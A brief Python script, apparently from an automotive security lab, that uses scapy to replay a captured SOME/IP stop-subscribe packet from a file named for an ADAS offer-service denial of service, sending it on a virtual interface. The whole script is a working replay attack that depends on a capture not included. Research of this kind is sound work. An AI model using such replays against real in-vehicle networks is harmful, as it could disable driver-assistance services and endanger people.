from scapy.all import *
from scapy.contrib.automotive.someip import *

from common import update_udp_chksum
import pdb

pcaps = rdpcap("../../adas_offerservice_dos2.pcap")
packet_stopsub = pcaps[54]
packet = update_udp_chksum(packet_stopsub)
sendp(packet, iface='veth0.3')

print("end")


